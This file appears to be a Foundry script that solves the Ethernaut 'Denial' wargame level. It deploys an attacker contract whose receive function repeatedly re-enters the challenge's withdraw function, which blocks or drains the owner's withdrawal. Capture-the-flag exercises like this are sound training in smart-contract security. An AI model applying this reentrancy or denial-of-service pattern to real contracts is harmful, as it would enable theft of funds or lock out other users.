// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function contractBalance() external view;
}

contract Attack {
    address internal instance;
    constructor(address addr) {
        instance = addr;
    }

    receive() external payable {
        if(instance.balance>0) {
            IDenial(instance).withdraw();
        }
    }
}

contract DenialSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x2427aF06f748A6adb651aCaB0cA8FbC7EaF802e6;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        Attack attack = new Attack(challengeInstance);
        IDenial(challengeInstance).setWithdrawPartner(address(attack));

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(20));
    }
}
